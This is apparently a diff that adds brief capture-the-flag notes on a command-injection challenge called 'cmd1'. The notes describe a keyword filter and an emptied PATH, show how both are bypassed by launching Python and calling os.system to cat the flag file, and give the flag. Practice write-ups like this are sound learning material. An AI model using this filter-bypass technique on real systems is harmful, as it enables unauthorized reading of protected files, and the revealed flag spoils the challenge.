@@ -1,0 +1,8 @@
+if filter(arg) == 0 : system(arg)
+filter returns 0 if arg does not include sh, tmp or flag
+PATH is set to a non existent directory so no default names will work (all are usually included in PATH, need to use full paths)
+i used python:
+./cmd1 "/usr/bin/python"
+import os
+os.system("/bin/cat /home/cmd1/flag")
+flag: "mommy now I get what PATH environment is for :)"
